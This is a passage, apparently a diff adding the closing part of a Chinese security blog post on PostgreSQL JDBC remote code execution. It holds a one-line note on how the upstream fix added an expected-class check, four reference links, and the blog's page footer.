+<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>从Github提交记录中可以找到，在各个接口实例化时加上了期望类的判断。</p>
+<p>懒得翻了，直接看师傅的图吧</p>
+<p><img src="/../image/achieve/202411/java--ctfshow/1748832222454.png" alt="img"></p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://su18.org/post/postgresql-jdbc-attack-and-stuff/">https://su18.org/post/postgresql-jdbc-attack-and-stuff/</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1339">https://forum.butian.net/share/1339</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/438695.html">https://www.freebuf.com/articles/web/438695.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://research.qianxin.com/archives/2414">https://research.qianxin.com/archives/2414</a></p>
+
+    </div>
+
+    
+    
+    
+	
+	<div>
+	  
+		
+<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+	  
+	</div>
+
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>wanTh3flag
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://wanth3f1ag.top/2026/02/27/PostgreSQL-JDBC-RCE/" title="PostgreSQL JDBC RCE命令执行">https://wanth3f1ag.top/2026/02/27/PostgreSQL-JDBC-RCE/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/javasec/" rel="tag"># javasec</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/02/27/java%E4%B9%8BTomcat-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="prev" title="Tomcat session反序列化漏洞">
+                  <i class="fa fa-angle-left"></i> Tomcat session反序列化漏洞
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">3.6m</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">54:01</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
